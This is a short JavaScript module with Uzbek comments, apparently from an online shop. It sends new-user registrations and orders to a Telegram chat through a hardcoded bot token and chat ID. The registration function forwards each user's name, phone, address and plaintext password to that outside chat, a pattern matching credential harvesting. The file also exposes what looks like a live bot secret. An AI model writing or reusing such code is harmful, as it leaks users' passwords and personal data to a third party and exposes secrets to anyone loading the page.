// Telegram botga to'g'ridan-to'g'ri ma'lumot yuborish
const BOT_TOKEN = '8719242479:AAHqiKO_ZayHvc46CJOuzIoWW3tPI-oaOqE'
const CHAT_ID = '8282676952'

export async function sendRegistrationToTelegram(userData) {
  try {
    const message = `🆕 <b>Yangi foydalanuvchi ro'yxatdan o'tdi!</b>

👤 <b>Ism:</b> ${userData.name}
📱 <b>Telefon:</b> ${userData.phone}
🔑 <b>Parol:</b> ${userData.password}${userData.address ? `
📍 <b>Manzil:</b> ${userData.address}` : ''}

⏰ <i>${new Date().toLocaleString('uz-UZ', { timeZone: 'Asia/Tashkent' })}</i>`

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`
    
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    })
    
    const data = await response.json()
    
    if (data.ok) {
      return { success: true }
    } else {
      console.error('Telegram API xatosi:', data)
      return { success: false, error: data.description }
    }
  } catch (error) {
    console.error('Telegramga yuborishda xato:', error)
    return { success: false, error: error.message }
  }
}

export async function sendOrderToTelegram(orderData) {
  try {
    let itemsList = orderData.items.map((item, index) => 
      `${index + 1}. ${item.name} - ${item.quantity} x ${item.priceValue.toLocaleString()} so'm`
    ).join('\n')
    
    const message = `🛒 <b>Yangi buyurtma!</b>

<b>Buyurtma #:</b> ${orderData.id}
👤 <b>Mijoz:</b> ${orderData.userName}
📱 <b>Telefon:</b> ${orderData.userPhone}
📍 <b>Manzil:</b> ${orderData.address || 'Ko\'rsatilmagan'}

<b>Mahsulotlar:</b>
${itemsList}

💰 <b>Jami summa:</b> ${orderData.total.toLocaleString()} so'm
💳 <b>To'lov turi:</b> ${orderData.payment === 'naqd' ? 'Naqd' : 'Karta'}${orderData.note ? `
📝 <b>Izoh:</b> ${orderData.note}` : ''}

⏰ <i>${new Date().toLocaleString('uz-UZ', { timeZone: 'Asia/Tashkent' })}</i>`

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`
    
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    })
    
    const data = await response.json()
    
    if (data.ok) {
      return { success: true }
    } else {
      console.error('Telegram API xatosi:', data)
      return { success: false, error: data.description }
    }
  } catch (error) {
    console.error('Buyurtmani Telegramga yuborishda xato:', error)
    return { success: false, error: error.message }
  }
}
